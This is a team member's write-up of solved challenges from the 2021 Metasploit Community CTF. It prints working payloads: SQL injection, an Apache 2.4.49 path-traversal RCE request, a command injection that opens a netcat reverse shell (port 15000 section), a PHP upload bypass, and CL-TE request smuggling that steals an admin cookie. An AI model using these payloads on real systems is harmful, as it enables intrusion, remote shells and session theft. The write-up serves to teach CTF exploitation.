---
description: Hosted by Rapid7 from 4 Dec to 7 Dec 2021
---

# Metasploit Community CTF

## Results

We placed 7th - managed to solve all but one challenge!&#x20;

The organizers wrote a nice summary of the CTF [here](https://www.rapid7.com/blog/post/2021/12/06/congrats-to-the-winners-of-the-2021-metasploit-community-ctf/).

![](<../.gitbook/assets/Screenshot 2021-12-07 at 10.49.50 AM.png>)

## Writeups

Since this year's challenges were sorted by difficulty (the higher the port number, the harder the challenge), I'll also sort my writeups by port number.&#x20;

I only included writeups for challenges that I solved - the rest were solved by my teammates!

| Card                                                                                      | Category          | Port         |
| ----------------------------------------------------------------------------------------- | ----------------- | ------------ |
| [9 of Diamonds](metasploit-community-ctf.md#port-8080-web)                                | Web               | 8080         |
| [4 of Diamonds](metasploit-community-ctf.md#port-10010-web)                               | Web               | 10010        |
| [5 of Diamonds](metasploit-community-ctf.md#port-11111-web)                               | Web               | 11111        |
| [10 of Clubs ](metasploit-community-ctf.md#port-12380-web)                                | Web               | 12380        |
| [5 of Clubs](metasploit-community-ctf.md#port-15000-pwn)                                  | Pwn               | 15000        |
| [4 of Clubs](metasploit-community-ctf.md#port-15010-web)                                  | Web               | 15010        |
| [2 of Clubs, Black Joker](metasploit-community-ctf.md#port-20000-20001-network-forensics) | Network Forensics | 20000, 20001 |
| [Ace of Hearts](metasploit-community-ctf.md#port-20001-web)                               | Web               | 20011        |
| [9 of Spades](metasploit-community-ctf.md#port-20055-web)                                 | Web               | 20055        |
| [8 of Clubs](metasploit-community-ctf.md#port-20123-crypto)                               | Crypto            | 20123        |
| [3 of Hearts](metasploit-community-ctf.md#port-33337-web)                                 | Web               | 33337        |
| [Ace of Diamonds](metasploit-community-ctf.md#port-35000-network-forensics)               | Network Forensics | 35000        |

### Port 8080 \[Web]

This was a simple cookie manipulation challenge. Cookies are set at every stage of authentication, and the following cookies grant us access to `/admin`.

```
Cookie: username=admin; visited-main-page=true; made-an-account=true; authenticated-user=true; admin=true
```

### Port 10010 \[Web]

When we log into the application, we can see the following data in the page source. There seems to be a `role` attribute that we need to change, in order to escalate our privileges.

```markup
<script>
    var current_account = {
    "id":3,
    "username":"username",
    "password":"password",
    "role":"user",
    "created_at":"2021-12-04T05:12:11.986Z",
    "updated_at":"2021-12-04T05:12:11.986Z"};
</script>
```

Taking a closer look at the registration fields, we see that we are submitting an `account` object with the `username` and `password` attributes.

```markup
<div>
  <label for="account_username">Username</label>
  <input type="text" name="account[username]" id="account_username" />
</div>

<div>
  <label for="account_password">Password</label>
  <input type="password" name="account[password]" id="account_password" />
</div>

<div>
  <input type="submit" name="commit" value="Register" class="btn btn-primary" data-disable-with="Register" />
</div>
```

Submitting with `account[role] = admin` changes our `role`, granting us access to `/admin`.

### Port 11111 \[Web]

This was a simple SQL injection in the login. The payload `username=admin&password=' or '1` grants us access.

### Port 12380 \[Web]

Our scan shows that this is a vulnerable version of Apache.

```
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-04 05:02 UTC
Nmap scan report for 172.17.17.69
Host is up (0.00049s latency).

PORT      STATE SERVICE VERSION
12380/tcp open  http    Apache httpd 2.4.49 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.49 (Debian)
```

{% embed url="https://www.exploit-db.com/exploits/50383" %}

We can exploit the RCE vulnerability to obtain the contents of the flag.

```http
GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
Host: localhost:8000
Content-Type: text/plain
Content-Length: 71

echo Content-Type: text/plain; echo; cat /secret/safe/flag.png | base64
```

### Port 15000 \[Pwn]

This was a TCP service that we could interact with via Netcat, and appears to be managing text files.

The "Create" option allows us to create a text file in the format `NAME_SURNAME.txt`. Validation is performed so that both fields are alphanumeric characters only.

The "Delete" option allows us to delete a file, similarly by entering the name and surname. However, after some fuzzing, we found that the surname wasn't properly validated.

```
Input: 4

Deleting a student with the following details:
Student name: 
Student surname: hihi.txt'
Invalid characters entered.

Found student file: _hihi.txt'.txt
Deleting...
Something went wrong! Contact your local administrator.
```

While an error message is shown, the deletion operation seems to have gone through.

After some testing, we found that there was an additional validation for the filename before going ahead with the deletion, but this appears to be insufficient as well, only matching the start of the filename.

For instance, `1_22.txt` matches the created file `1_2.txt`.&#x20;

I then created the three files below and tested a wildcard in the filename.

```
5. abc abc
6. abc abcabc
7. abc abcdef

...

Found student file: abc_abc*.txt
Deleting...
Completed.
```

Surprisingly, all three files were deleted! It occurred to me that `rm abc_abc*.txt` would have given this result, so we could hypothesise that a command injection could be performed.

```
Input: 4   

Deleting a student with the following details:
Student name: name
Student surname: surname; nc 172.17.17.68 80 -e /bin/sh;
Invalid characters entered.

Found student file: name_surname; nc 172.17.17.68 80 -e /bin/sh;.txt
Deleting...
```

Indeed, we received a shell! From here we can obtain the MD5 of the flag.

```
md5sum /hidden_storage/5_of_clubs.png
0c3c3d0e090f792ba5cedc8a2fe72b36  /hidden_storage/5_of_clubs.png
```

### Port 15010  \[Web]

After registration, we get redirected to `/users/<username>/files`, where we can upload files.

By testing with two accounts, we will also find that username enumeration is possible at `/users/<username>`, since a valid username results in a 403 redirect to our own account, while an invalid username results in a 404 Not Found error.

Performing a username enumeration (using the `dirb` wordlist) yielded the following valid usernames:

* `admin`
* `root`
* `builder`
* `employee`
* `staff`

We will also find that while validation is performed on the `/users/<username>` page, the application does not check whether we are the owner of the file when we request a file at `/users/<username>/files/<filename>`. This constitutes an IDOR vulnerability.

I then scanned each username for potential files, and eventually found `/users/employee/files/fileadmin`, which was the flag.

### Port 20000, 20001 \[Network Forensics]

This was a game called Clicktracer. The client connects to the game server at port 20001, and winning the game gives us flags!

#### Easy Mode

When playing in easy mode, the messages are logged to the console.

![](<../.gitbook/assets/image (80).png>)

This was interesting, so I decided to spin up Wireshark to analyse the traffic.

The client-server communication appeared to be simple JSON messages. A client heartbeat is sent periodically to prevent the game from timing out, and the coordinates clicked by the user are sent as well. The server sends the client the coordinates of each target that is created.

![](<../.gitbook/assets/image (89).png>)

We could beat the easy mode by implementing a custom client that "clicks" on each target that is received.

```python
from pwn import *
import json

conn = remote('localhost', 20001)
conn.sendline(json.dumps({"StartGame":{"game_mode":"Easy"}}))
conn.sendline(json.dumps({"ClientHeartBeat": {}}))

while True:
    received = conn.recvline().decode()
    received = json.loads(received)
    if 'TargetCreated' in received:
        conn.sendline(json.dumps(
            {"ClientClick": {"x": received['TargetCreated']['x'], "y": received['TargetCreated']['y']}}
        ))
        conn.sendline(json.dumps({"ClientHeartBeat": {}}))

    print(received)
```

When we win the game, we get a URL to download the flag.

#### Hard Mode

This was more complex, but we could still pick up some patterns if we look hard enough.

![](<../.gitbook/assets/image (86).png>)

Some kind of TLV protocol is used, but the general idea remains the same. By capturing the traffic a few times, we can infer the meaning of each field!

The client starts the game with the following bytes. This is observed as the first packet in the capture. Note that the 4th byte is the "command" byte, which indicates which type of message this is. In this message, the command byte is 0x20.

```
00 00 00 20 00 00 00 00  00 00 00 0c 00 02 00 01   ... .... ........
00 00 00 03 00 00 00 0c  00 02 4e 84 00 00 00 03   ........ ..N.....
00 00 00 14 00 00 00 00  00 00 00 0c 00 02 00 01   ........ ........
00 00 00 01 
```

A client heartbeat is periodically sent (command 0x14).

```
00 00 00 14 00 00 00 00  00 00 00 0c 00 02 00 01   ........ ........
00 00 00 01 
```

We could also observe that whenever we make a click, the following message is sent (command 0x2c). The only parts of this message that vary are the 4 bytes indicated by `[ X ]` and `[ Y ]` below - these are the coordinates that we clicked.

```
00 00 00 2c 00 00 00 00  00 00 00 0c 00 02 00 01   ...,.... ........
00 00 00 07 00 00 00 0c  00 02 4e e8 00 00 [ X ]   ........ ..N....j
00 00 00 0c 00 02 4e e9  00 00 [ Y ]               ......N. ....
```

Similarly, the server acknowledges our clicks (with either a target hit or target missed message).

```
00 00 00 2c 00 00 00 00  00 00 00 0c 00 02 00 01   ...,.... ........
00 00 00 0b 00 00 00 0c  00 02 50 14 00 00 [ X ]   ........ ..P.....
00 00 00 0c 00 02 50 15  00 00 [ Y ] 
```

The server sends the next coordinates (command 0x38).

```
00 00 00 38 00 00 00 00  00 00 00 0c 00 02 00 01   ...8.... ........
00 00 00 09 00 00 00 0c  00 02 4f 4c 00 00 00 02   ........ ..OL....
00 00 00 0c 00 02 4f 4d  00 00 [ X ] 00 00 00 0c   ......OM ...Y....
00 02 4f 4e 00 00 [ Y ]
```

We could implement a similar client that solves the hard mode.&#x20;

```python
from pwn import *
from textwrap import wrap

conn = remote("localhost", 20001)

START_GAME = bytes.fromhex(''.join('00 00 00 20 00 00 00 00  00 00 00 0c 00 02 00 01 00 00 00 03 00 00 00 0c  00 02 4e 84 00 00 00 03 00 00 00 14 00 00 00 00  00 00 00 0c 00 02 00 01 00 00 00 01'.split()))
HEARTBEAT = bytes.fromhex(''.join('00 00 00 14 00 00 00 00  00 00 00 0c 00 02 00 01 00 00 00 01'.split()))

conn.send(START_GAME)
conn.send(HEARTBEAT)

while True:
	received = conn.recv()
	print(received)
	
	received = wrap(received.hex(), 2)
	print(received)
	
	if received[3] == '38':
		x = received[42:44]
		y = received[-2:]
		
		print(x, y)
		conn.send(bytes.fromhex(''.join(f'00 00 00 2c 00 00 00 00  00 00 00 0c 00 02 00 01  00 00 00 07 00 00 00 0c  00 02 4e e8 00 00 {x[0]} {x[1]} 00 00 00 0c 00 02 4e e9  00 00{y[0]} {y[1]}'.split())))
```

### Port 20011 \[Web]

This is an SSRF in the `galleryUrl` parameter. By requesting the `/admin` internally, we gain access to the admin console: `/gallery?galleryUrl=http://localhost:20011/admin`

### Port 20055 \[Web]

This wa PHP file upload challenge. We are provided with the following source code.

```php
<?php
    $storage_dir = "file_uploads/";
    $full_storage_path = $storage_dir . basename($_FILES["fileName"]["name"]);
    $file_ext = pathinfo($full_storage_path, PATHINFO_EXTENSION);
    $file_ext = strtolower($file_ext);
    $blocked_ext = ["php", "php2", "php3", "php4", "php5", "php6", "php7", "php8", "phps", "pht", "phtm", "phar", "phtml", "pgif", "shtml", "html", "inc", "cgi", "asp", "aspx", "config", "pl", "py", "rs", "rb", "vbhtml", "vbtm", "vb", "phpt", "phtml"];
    echo($file_ext);
    if (in_array($file_ext, $blocked_ext, true) === true){
    echo("<html><h1>Blocked file extension detected! File upload blocked!</h1></html>");
    exit(1);
    }
    
    // Check file size
    if ($_FILES["fileName"]["size"] > 500000) {
    echo("<html><p>Sorry, your file is too large.</p></html>");
    exit(2);
    }
    
    // Move the uploaded file
    if (move_uploaded_file($_FILES["fileName"]["tmp_name"], $full_storage_path) === true){
    echo("<html><p>File has been uploaded successfully and is now available <a href='/$full_storage_path'>here</a>! But can you figure out how to execute it?</html>");
    }
    else{
    echo("<html><p>File was not successfully uploaded!</p></html>");
    }
?>
```

While most common PHP file extensions are blocked, `.htaccess` was not!

We could upload a `.htaccess` file to tell Apache to interpret some arbitrary file extension as a PHP file (e.g. `.php16`).

```http
Content-Disposition: form-data; name="fileName"; filename=".htaccess"
Content-Type: text/html

AddHandler application/x-httpd-php .php16      # Say all file with extension .php16 will execute php
```

Then, uploading any file with the `.php16` extension results in RCE, and we can download the flag..

```http
Content-Disposition: form-data; name="fileName"; filename="test.php16"
Content-Type: text/html

<?php
$file = '/flag.png';

if (file_exists($file)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
```

### Port 20123 \[Crypto]

This was an SSH port, which we could access with `root:root`. In the `/challenge` directory, there was an encrypted flag and the Python program used to encrypt it.

```python
import argparse
import random
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
DEBUG = False
UNKNOWN_ERROR = 1001


def get_salt(seed=1337):  # Need a seed so the salt stays the same
    try:
        generator = random.Random(seed)
        if DEBUG:
            print(generator.getstate())
        return generator.randbytes(32)
    except:
        return UNKNOWN_ERROR


def get_token():
    try:
        generator = random.SystemRandom()
        if DEBUG:
            print(generator.getstate())
        return generator.randbytes(32)
    except:
        return UNKNOWN_ERROR


def encrypt_flag(file):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=get_salt(),
        iterations=100000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(bytes(get_token())))
    # Fernet uses the time and an IV so it never produces the same output twice even with the same key and data
    fernet = Fernet(key)
    return fernet.encrypt(file)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Encrypt a file and save the output')
    parser.add_argument('input_file')
    parser.add_argument('output_file')

    parser.add_argument('--debug', action="store_true")
    args = parser.parse_args()
    if args.debug:
        DEBUG = True

    with open(args.input_file, "rb") as f:
        encrypted_file = encrypt_flag(f.read())

    with open(args.output_file, "wb") as f:
        f.write(encrypted_file)
```

In the history file, we could see the exact command that was used to encrypt it.

```
feef14e2d7f7:~/challenge# cat /root/.ash_history
python3 encrypt_flag.py 8_of_clubs.png encrypted_flag --debug
rm -rf 8_of_clubs.png
```

The vulnerability comes from the following part of the code:

```python
def get_token():
    try:
        generator = random.SystemRandom()
        if DEBUG:
            print(generator.getstate())
        return generator.randbytes(32)
    except:
        return UNKNOWN_ERROR
```

While `random.SystemRandom()` is cryptographically secure (it uses `os.urandom()`), the behaviour when the debug flag is passed is interesting.&#x20;

Note that `getstate()` is called on the generator object, but the documentation clearly states that this will raise a `NotImplementedError`.

![](<../.gitbook/assets/image (88).png>)

This script was run with `--debug`, resulting in `getstate()` being called and `NotImplementedError` being raised - so `UNKNOWN_ERROR` = 1001 is the token.

We would therefore be able to reconstruct the key and obtain the flag.

```python
import argparse
import random
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
DEBUG = False
UNKNOWN_ERROR = 1001


def get_salt(seed=1337):  # Need a seed so the salt stays the same
    try:
        generator = random.Random(seed)
        if DEBUG:
            print(generator.getstate())
        return generator.randbytes(32)
    except:
        return UNKNOWN_ERROR


def get_token():
    return UNKNOWN_ERROR


def decrypt(flag):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=get_salt(),
        iterations=100000,
    )
    print(get_token())
    key = base64.urlsafe_b64encode(kdf.derive(bytes(get_token())))
    # Fernet uses the time and an IV so it never produces the same output twice even with the same key and data
    fernet = Fernet(key)
    return fernet.decrypt(flag)


if __name__ == '__main__':
    out = decrypt(open('encrypted_flag', 'rb').read())
    with open('flag_out.png', 'wb') as f:
        f.write(out)
```

### Port 33337 \[Web]

In the `Server` response header, we could see that the Apache Traffic Server (ATS) 7.1.1 was used,

This is vulnerable to CVE-2018-8004, a request smuggling vulnerability, and I came across a nice writeup [here](https://medium.com/@knownsec404team/protocol-layer-attack-http-request-smuggling-cc654535b6f). The relevant patch we are looking at is [here](https://github.com/apache/trafficserver/pull/3231) - a lack of validation for `Content-Length` headers.

In the vulnerable version, even if the `Transfer-Encoding` header exists, the `Content-Length` header is used. This leads to a request smuggling vulnerability if the backend server processes the `Transfer-Encoding` header instead of the `Content-Length` header to decide where the request ends.

![](<../.gitbook/assets/Screenshot 2021-12-07 at 1.03.20 PM.png>)

It was observed that whenever a request is made to `/save.php`, an entry is appended to a "log file", which contains the cookies and the value of the `X-Access` header.

Assuming that an admin visits the site, we could use a CL-TE request smuggling attack to direct the admin to `/save.php`.

Consider the following payload:

```http
GET / HTTP/1.1
Host: threeofhearts.ctf.net
Content-Length: 30
Transfer-Encoding: chunked

0

GET /save.php HTTP/1.1
```

The ATS server processes the `Content-Length` header, and thus forwards the entire payload as a single request to the Nginx backend.&#x20;

However, Nginx sees the `Transfer-Encoding` header and decides that the first request ends early. This is a full, complete request.

```http
GET / HTTP/1.1
Host: threeofhearts.ctf.net
Content-Length: 30
Transfer-Encoding: chunked
```

This is then followed by a second request, which is _not yet completed._

```http
GET /save.php HTTP/1.1
```

When the admin visits the site (the third request), his request is appended to the above incomplete request - the second and third request thus are processed as one single request.

```http
GET /save.php HTTP/1.1

...

Cookie: <Admin Cookies>
X-Access: <Admin X-Access Header>
```

Crucially, this request contains the admin's `Cookie` and `X-Access` headers.

In the log file, we can view the cookie:

```
Params:
Headers:
	X-Access: private
	Cookie: PHPSESSID=8m9k6s84bmdf270tbi81bpacc7
```

Then, visit `private.php` to view the flag.

```http
GET /private.php HTTP/1.1
Host: threeofhearts.ctf.net
X-Access: private
Cookie: PHPSESSID=8m9k6s84bmdf270tbi81bpacc7
```

### Port 35000 \[Network Forensics]

We are provided with a PCAP file, containing some SMB traffic. There are some hints in the traffic:

`What does this protocol use to align fields?`

`A lot of things can happen when structures are not properly aligned`

`But wait... is the actual value matter?`

`Not too much to find here... just regular backups`

`The content is not that useful as it looks like.`

This prompted me to read up on the Microsoft [documentation](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-cifs/a66126d2-a1db-446b-8736-b9f5559c49bd) for SMB requests. One of the details was quite interesting, since the hint talked about alignment.

> Optional padding follows the SMB\_Data block of the SMB\_COM\_CLOSE. If present, the padding is used to align the SMB\_Data.Bytes.Data block to a 16- or 32-bit boundary.

The padding byte in the SMB request exists in order to align the data that follows. But as the documentation specifies, the actual value of the padding byte doesn't matter.

![](<../.gitbook/assets/image (92).png>)

Upon closer inspection, we will find that the padding in `WriteX` (1 byte padding) and `Trans2` (2 byte padding) requests contain the exfiltrated data.

The following script parses the PCAP and extracts the relevant data.

```python
from scapy.all import *

packets = rdpcap('capture.pcap')

padding_bytes = []

for packet in packets:
    packet[TCP].decode_payload_as(NBTSession)
    if 'SMBNegociate Protocol Request Header' in packet:
        
        smb_header = packet['SMBNegociate Protocol Request Header']
        if smb_header.Command == 0x2f and smb_header.Flags == 0x18:
            padding = bytes(smb_header)[59]
            padding_bytes.append(padding)

        elif smb_header.Command == 0x32 and smb_header.Flags == 0x18:
            padding = bytes(smb_header)[66:68]
            padding_bytes += list(padding)

print(bytes(padding_bytes))
```

The result is the flag URL!

`Here is the URL you are looking for: /U,rhbjaaCeDseVRQzEO.YsgXXtoGKpvUEkZXaoxurhdYnIlpJiGszZwUktVWTS,DabQAhvbEDQaNL_Dhsq.pposWkG-DtQdIVXNEWd.KbtYXvCek_gJuzIrDtMHfITFL/flag.png`
